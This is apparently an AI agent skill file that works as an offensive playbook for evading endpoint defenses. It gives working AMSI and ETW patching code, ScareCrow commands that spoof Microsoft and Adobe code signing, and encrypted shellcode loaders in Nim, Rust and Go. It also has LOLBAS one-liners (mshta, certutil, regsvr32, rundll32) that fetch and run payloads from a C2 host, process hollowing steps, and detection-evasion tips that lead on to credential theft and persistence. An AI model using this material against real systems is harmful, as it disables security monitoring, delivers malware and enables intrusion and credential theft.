---
name: defense-evasion
description: "Endpoint defense bypass — AMSI/ETW patching, ScareCrow framework, custom loaders, direct/indirect syscalls, LOLBAS execution, process injection."
allowed-tools: Bash Read Write
metadata:
  subdomain: defense-evasion
  when_to_use: "AMSI bypass, ETW patch, EDR evasion, ScareCrow, custom loader, syscall, LOLBAS, process injection, defense evasion, AV bypass"
  tags: amsi, etw, edr, scarecrow, loader, syscall, lolbas, injection, evasion
  mitre_attack: T1562, T1027, T1055, T1218, T1036, T1140
---

# Defense Evasion Knowledge Base

Defense evasion techniques disable, bypass, or avoid endpoint security controls (AV, EDR, AMSI, ETW) to ensure payloads execute and implants persist without detection. Every technique here has a shelf life --- detections evolve constantly. Always test against the target's specific stack before deployment.

## Quick Reference

| Task | Technique | Risk Level |
|------|-----------|------------|
| Disable AMSI | Memory patch `AmsiScanBuffer` | Medium |
| Disable AMSI (stealthier) | Hardware breakpoint on `AmsiScanBuffer` | Low |
| Disable ETW | Patch `EtwEventWrite` | Medium |
| Unhook EDR DLLs | ScareCrow / manual ntdll reload | High |
| Generate evasive payload | ScareCrow with AES encryption | Medium |
| Execute via LOLBAS | mshta, certutil, rundll32, regsvr32 | Varies |
| Process injection | Process hollowing, early bird | High |
| Custom loader | Nim/Rust/Go shellcode runner | Low-Medium |

## MITRE ATT&CK Mapping

| Technique ID | Name | Evasion Relevance |
|-------------|------|-------------------|
| T1562 | Impair Defenses | AMSI/ETW patching, disabling logging |
| T1027 | Obfuscated Files or Information | AES-encrypted shellcode, encoding |
| T1055 | Process Injection | Hollowing, APC injection, thread hijack |
| T1218 | System Binary Proxy Execution | LOLBAS (mshta, rundll32, regsvr32) |
| T1036 | Masquerading | Spoofed code signing, renamed binaries |
| T1140 | Deobfuscate/Decode Files | Runtime decryption of payloads |

## 1. AMSI Bypass Techniques

### Memory Patching (AmsiScanBuffer)
```powershell
# Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
# This patches the first bytes of AmsiScanBuffer with a return instruction

$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $amsi.GetField('amsiContext', 'NonPublic,Static')
$ptr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($field.GetValue($null))

# Get AmsiScanBuffer address
$lib = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
$addr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")

# Change memory protection, write patch, restore protection
[Win32]::VirtualProtect($addr, [uint32]$patch.Length, 0x40, [ref]0)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
```

### Hardware Breakpoint Method (Stealthier)
```csharp
// Set hardware breakpoint on AmsiScanBuffer
// When hit, modify return value via exception handler
// Does NOT modify memory — avoids integrity checks

// 1. Register Vectored Exception Handler (VEH)
// 2. Set DR0 = address of AmsiScanBuffer
// 3. Set DR7 to enable breakpoint on execution
// 4. On exception: set RAX = AMSI_RESULT_CLEAN, advance RIP past function
// 5. Continue execution

// Advantage: No memory patches detectable by EDR memory scanning
// Disadvantage: DR registers are per-thread, must set for each thread
```

### Reflection Method
```powershell
# Use reflection to set amsiInitFailed = true
# Prevents AMSI initialization in the current process

[Ref].Assembly.GetType(
    'System.Management.Automation.AmsiUtils'
).GetField(
    'amsiInitFailed',
    'NonPublic,Static'
).SetValue($null, $true)
```

### AMSI Bypass OPSEC Notes
| Method | Detectable By | OPSEC Rating |
|--------|--------------|--------------|
| Memory patch | EDR memory scanning, Integrity checks | Medium |
| Hardware breakpoint | Thread context inspection (rare) | High |
| Reflection (amsiInitFailed) | Script block logging, known signature | Low |
| Forcing AMSI error | Process monitor, event correlation | Medium |

## 2. ETW Patching

### Patching EtwEventWrite
```csharp
// Patch ntdll!EtwEventWrite to return immediately (ret = 0xC3)
// This disables Event Tracing for Windows in the current process
// Prevents .NET assembly loading events, PowerShell logging, etc.

IntPtr etwAddr = GetProcAddress(
    GetModuleHandle("ntdll.dll"),
    "EtwEventWrite"
);

// Write 'ret' instruction (0xC3) at function entry
uint oldProtect;
VirtualProtect(etwAddr, 1, 0x40, out oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);
VirtualProtect(etwAddr, 1, oldProtect, out oldProtect);
```

### What ETW Patching Disables
- .NET assembly load events (used by EDR to detect execute-assembly)
- PowerShell ScriptBlock logging
- Process creation events via ETW providers
- Network connection telemetry from userland

### ETW OPSEC Notes
- Patch BEFORE loading any tools or assemblies
- Some EDRs monitor `EtwEventWrite` integrity --- pair with unhooking
- Kernel-level ETW (via ETW Threat Intelligence provider) is NOT affected by userland patches
- Consider patching `NtTraceEvent` as well for deeper coverage

## 3. ScareCrow Framework

### Overview
ScareCrow generates payloads that bypass EDR by unhooking userland API hooks, using direct syscalls, and applying AES encryption with spoofed code signing certificates.

### Basic Payload Generation
```bash
# Generate EDR-evasive loader with AES-encrypted shellcode
ScareCrow -I implants/shellcode.bin \
    -Loader binary \
    -domain microsoft.com \
    -encryptionmode AES \
    -o implants/evasive_payload.exe

# DLL output (for sideloading)
ScareCrow -I implants/shellcode.bin \
    -Loader dll \
    -domain microsoft.com \
    -encryptionmode AES \
    -o implants/evasive_payload.dll

# Control process for injection
ScareCrow -I implants/shellcode.bin \
    -Loader binary \
    -domain microsoft.com \
    -injection "C:\\Windows\\System32\\notepad.exe" \
    -encryptionmode AES \
    -o implants/injected_payload.exe
```

### ScareCrow Features
| Feature | Flag | Description |
|---------|------|-------------|
| EDR unhooking | (default) | Loads clean ntdll.dll from disk, replaces hooked copy |
| AES encryption | `-encryptionmode AES` | Encrypts shellcode, decrypts at runtime |
| Code signing spoof | `-domain microsoft.com` | Spoofs authenticode signature from specified domain |
| Process injection | `-injection <path>` | Injects into specified sacrificial process |
| DLL loader | `-Loader dll` | Output as DLL for sideloading scenarios |
| Console hiding | `-console` | Hides console window on execution |
| Sandbox evasion | `-sandbox` | Adds anti-sandbox checks (sleep, mouse, CPU) |

### Code Signing Spoofing
```bash
# Spoof Microsoft code signing cert
ScareCrow -I shellcode.bin -domain microsoft.com -Loader binary -o payload.exe

# Spoof any vendor
ScareCrow -I shellcode.bin -domain adobe.com -Loader binary -o payload.exe

# How it works:
# 1. Fetches the real SSL certificate from the target domain
# 2. Creates a self-signed certificate using the same subject/issuer fields
# 3. Signs the binary with this spoofed certificate
# 4. Many EDRs only check if a cert is present, not full chain validation
```

## 4. Custom Loaders

All loaders follow the same pattern: decrypt shellcode at runtime, allocate RW memory, copy shellcode, change to RX, execute via thread.

### Nim Shellcode Loader
```nim
# Compile: nim c -d:mingw -d:release --app:gui nim_loader.nim
import winim/lean

const encShellcode: array[N, byte] = [ # <ENCRYPTED_SHELLCODE_BYTES> ]
const key: array[16, byte] = [ # <KEY_BYTES> ]

proc main() =
    var shellcode = newSeq[byte](encShellcode.len)
    for i in 0..<encShellcode.len:
        shellcode[i] = encShellcode[i] xor key[i mod key.len]
    let mem = VirtualAlloc(nil, shellcode.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    copyMem(mem, unsafeAddr shellcode[0], shellcode.len)
    var oldProtect: DWORD
    VirtualProtect(mem, shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)
    WaitForSingleObject(CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, nil), INFINITE)
main()
```

### Rust Shellcode Loader
```rust
// Build: cargo build --release --target x86_64-pc-windows-gnu
#![windows_subsystem = "windows"]
use std::ptr;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;

const ENC_SC: &[u8] = &[ /* <ENCRYPTED_SHELLCODE_BYTES> */ ];
const KEY: &[u8] = &[ /* <KEY_BYTES> */ ];

fn main() {
    let sc: Vec<u8> = ENC_SC.iter().enumerate().map(|(i, b)| b ^ KEY[i % KEY.len()]).collect();
    unsafe {
        let mem = VirtualAlloc(ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ptr::copy_nonoverlapping(sc.as_ptr(), mem as *mut u8, sc.len());
        let mut op: u32 = 0;
        VirtualProtect(mem, sc.len(), PAGE_EXECUTE_READ, &mut op);
        WaitForSingleObject(
            CreateThread(ptr::null(), 0, Some(std::mem::transmute(mem)), ptr::null(), 0, ptr::null_mut()),
            0xFFFFFFFF);
    }
}
```

### Go Shellcode Loader
```go
// Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" go_loader.go
package main
import ("syscall"; "unsafe")

var encSC = []byte{ /* <ENCRYPTED_SHELLCODE_BYTES> */ }
var key = []byte{ /* <KEY_BYTES> */ }

func main() {
    sc := make([]byte, len(encSC))
    for i := range encSC { sc[i] = encSC[i] ^ key[i%len(key)] }
    k32 := syscall.MustLoadDLL("kernel32.dll")
    addr, _, _ := k32.MustFindProc("VirtualAlloc").Call(0, uintptr(len(sc)), 0x3000, 0x40)
    syscall.MustLoadDLL("ntdll.dll").MustFindProc("RtlCopyMemory").Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    t, _, _ := k32.MustFindProc("CreateThread").Call(0, 0, addr, 0, 0, 0)
    k32.MustFindProc("WaitForSingleObject").Call(t, 0xFFFFFFFF)
}
```

### Loader OPSEC Comparison
| Language | Binary Size | AV Detection Rate | Notes |
|----------|-------------|-------------------|-------|
| Nim | ~50-100 KB | Low | Small, good Win API bindings |
| Rust | ~150-300 KB | Low | Strong type safety, no runtime |
| Go | ~2-5 MB | Low-Medium | Larger binary, distinct import table |
| C/C++ | ~10-50 KB | Medium | Well-known patterns, heavily signatured |
| C# | ~10-30 KB | High | .NET metadata, AMSI applies |

## 5. Direct & Indirect Syscalls

### Concept
Syscalls bypass userland API hooks placed by EDR on ntdll.dll functions. Instead of calling `NtAllocateVirtualMemory` through the hooked ntdll export, the code directly invokes the syscall instruction with the correct System Service Number (SSN).

### Direct Syscalls
```
Normal API Call Flow (hooked by EDR):
  Code → kernel32.dll → ntdll.dll [HOOKED] → syscall

Direct Syscall Flow (bypasses hooks):
  Code → syscall instruction (SSN resolved at runtime)
```

### Indirect Syscalls
```
Indirect Syscall Flow (stealthier):
  Code → jump to 'syscall' instruction inside ntdll.dll
  (Return address points to ntdll.dll, not our code)

Advantage: Call stack looks legitimate to EDR stack inspection
```

### SSN Resolution Methods
| Method | Description | OPSEC |
|--------|-------------|-------|
| Hardcoded | SSNs baked into binary (version-specific) | Brittle, easy to detect |
| Halo's Gate | Scan neighboring ntdll exports for unhooked SSNs | Medium |
| Hell's Gate | Parse ntdll in memory to find SSNs | Medium |
| Tartarus' Gate | Handle both hooked and unhooked neighbors | High |
| FreshyCalls | Sort Zw* exports by address to derive SSNs | High |
| SysWhispers3 | Generates syscall stubs with multiple techniques | Medium-High |

### Tools
```bash
# SysWhispers3 — generate syscall stubs
python3 syswhispers.py --preset common -o syscalls/

# Output: syscalls.h, syscalls.c, syscalls-asm.x64.asm
# Integrate into C/C++ loader project
```

## 6. LOLBAS (Living Off the Land Binaries and Scripts)

### mshta.exe (T1218.005)
```bash
# Execute HTA payload
mshta.exe http://<C2_HOST>/payload.hta

# Inline VBScript execution
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -f \\<C2>\share\payload.ps1"", 0:close")

# OPSEC: mshta.exe spawning child processes is heavily monitored
```

### certutil.exe (T1140)
```bash
# Download file (encoded transfer)
certutil.exe -urlcache -split -f http://<C2_HOST>/payload.exe C:\Windows\Temp\payload.exe

# Base64 decode a payload
certutil.exe -decode C:\Windows\Temp\encoded.b64 C:\Windows\Temp\payload.exe

# OPSEC: certutil network connections are high-fidelity alerts
```

### rundll32.exe (T1218.011)
```bash
# Execute DLL export
rundll32.exe payload.dll,EntryPoint

# Execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")

# Execute via URL (DLL from SMB)
rundll32.exe \\<C2_HOST>\share\payload.dll,Start
```

### regsvr32.exe (T1218.010)
```bash
# Execute SCT file (Squiblydoo)
regsvr32.exe /s /n /u /i:http://<C2_HOST>/payload.sct scrobj.dll

# Local SCT execution
regsvr32.exe /s /n /u /i:C:\Windows\Temp\payload.sct scrobj.dll

# OPSEC: regsvr32 loading scrobj.dll is a well-known detection signature
```

### LOLBAS OPSEC Summary
| Binary | Detection Risk | Common Alert | Mitigation |
|--------|---------------|--------------|------------|
| mshta.exe | High | Child process spawn, network conn | Use only if no alternative |
| certutil.exe | Very High | `-urlcache` flag, network download | Prefer BITSAdmin or PowerShell |
| rundll32.exe | Medium | Unusual DLL paths, network loads | Use legitimate-looking DLL paths |
| regsvr32.exe | High | scrobj.dll load, network SCT fetch | Prefer local execution |

## 7. Process Injection

### Process Hollowing (T1055.012)
```
Process Hollowing Steps:
1. Create target process in SUSPENDED state
   CreateProcessW("svchost.exe", ..., CREATE_SUSPENDED)

2. Unmap the original executable image
   NtUnmapViewOfSection(hProcess, pImageBase)

3. Allocate memory at the original base address
   VirtualAllocEx(hProcess, pImageBase, imageSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

4. Write malicious PE image into allocated memory
   WriteProcessMemory(hProcess, pImageBase, maliciousPE, imageSize)

5. Update thread context to point to new entry point
   SetThreadContext(hThread, &context)

6. Resume the suspended thread
   ResumeThread(hThread)
```

### Common Injection Targets
| Process | Legitimacy | Risk |
|---------|-----------|------|
| svchost.exe | Runs many instances normally | Low (if correct parent) |
| RuntimeBroker.exe | Common in user sessions | Low |
| explorer.exe | Always running | Medium (single instance) |
| notepad.exe | Spawned on demand | Medium (must justify spawn) |
| dllhost.exe | COM surrogate, common | Low |

### Injection OPSEC
- **Parent-child relationship**: svchost.exe must have services.exe as parent
- **Memory permissions**: Avoid RWX; use RW for write, then change to RX
- **Unbacked memory**: EDRs flag executable memory not backed by a file on disk
- **Thread creation**: `CreateRemoteThread` is heavily monitored; prefer APC injection
- **Call stack**: Must look legitimate; use indirect syscalls for API calls

## 8. Tools & Resources

| Tool | Purpose | Source |
|------|---------|--------|
| ScareCrow | EDR evasion payload generator | `https://github.com/optiv/ScareCrow` |
| SysWhispers3 | Syscall stub generator | `https://github.com/klezVirus/SysWhispers3` |
| Nimcrypt2 | Nim-based packer/loader | `https://github.com/icyguider/Nimcrypt2` |
| Freeze | Payload creation with suspend/inject | `https://github.com/optiv/Freeze` |
| donut | PE/DLL/VBS/JS to position-independent shellcode | `https://github.com/TheWover/donut` |
| LOLBAS Project | LOLBAS reference database | `https://lolbas-project.github.io/` |
| InlineWhispers | BOF-compatible syscall stubs | `https://github.com/outflanknl/InlineWhispers` |
| SharpUnhooker | C# EDR unhooking utility | Community tool |

## 9. Detection Signatures

| Indicator | Signature / Pattern | OPSEC Note |
|-----------|-------------------|------------|
| AMSI patch detection | Integrity check on `AmsiScanBuffer` first bytes | Use hardware breakpoint method instead |
| ETW patch detection | `EtwEventWrite` starts with `0xC3` (ret) | Patch after EDR init, or use syscall-level patch |
| Memory scan (RWX) | VirtualAlloc with PAGE_EXECUTE_READWRITE | Allocate RW, copy, then VirtualProtect to RX |
| Unbacked executable memory | Executable pages not mapped to a file | Use module stomping or DLL hollowing |
| Suspicious parent-child | mshta/certutil/rundll32 spawning cmd/powershell | Match expected process trees |
| Code signing mismatch | Certificate subject does not match binary metadata | Align PE metadata with spoofed cert |
| Shellcode entropy | High entropy sections in PE or memory | Add low-entropy padding, use encoding layers |
| .NET assembly loading | ETW Assembly.Load events from unusual processes | Patch ETW before loading, or use BOFs |
| Syscall from non-ntdll | `syscall` instruction outside ntdll address range | Use indirect syscalls (jmp to ntdll gadget) |
| Thread start address | Thread entry point in unbacked memory region | Use callback-based execution (timers, APCs) |

## 10. Decision Gate

### Defense Evasion Complete --- Next Steps

```
Defenses Bypassed (AV/EDR/AMSI/ETW neutralized)
│
├──→ Execution
│    - Run payload/implant on target
│    - Execute post-exploitation tooling
│    - Load C2 agent in memory
│
├──→ Persistence
│    - Scheduled tasks with evasive payloads
│    - Registry-based persistence (Run keys)
│    - DLL sideloading in legitimate app directories
│    - COM object hijacking
│
├──→ Credential Access
│    - LSASS dump (with EDR bypassed)
│    - SAM extraction
│    - Kerberoasting / AS-REP roasting
│
└──→ C2 Channel Establishment
     - Deploy implant with evasion features
     - Confirm callback through redirector
     - Set jitter and sleep obfuscation
```

### Pre-Execution Checklist
- [ ] AMSI bypassed in target PowerShell/CLR context
- [ ] ETW patched to prevent assembly load telemetry
- [ ] Payload tested against target's AV/EDR stack (or equivalent)
- [ ] Custom loader compiled and signed (spoofed cert)
- [ ] Injection target process identified and validated
- [ ] Backup evasion technique prepared (if primary is burned)
- [ ] OPSEC review: no test artifacts left on target

## 11. Output Files

```
./
├── implants/
│   ├── evasive_payload.exe        # ScareCrow-generated payload
│   ├── evasive_payload.dll        # DLL variant for sideloading
│   └── shellcode.bin              # Raw shellcode input
├── loaders/
│   ├── nim_loader.nim             # Nim custom loader source
│   ├── rust_loader/               # Rust loader project
│   └── go_loader.go              # Go loader source
├── syscalls/
│   ├── syscalls.h                 # SysWhispers3 output
│   ├── syscalls.c                 # Syscall implementations
│   └── syscalls-asm.x64.asm       # Assembly stubs
└── evasion_test_results.md        # AV/EDR test outcomes
```

## Bundled Resources

### References
- `references/amsi-bypass-techniques.md` — AMSI architecture, memory patching (AmsiScanBuffer), hardware breakpoints, reflection bypasses, ETW patching, detection vectors, layered bypass approach. Read when selecting AMSI/ETW bypass technique for target environment.
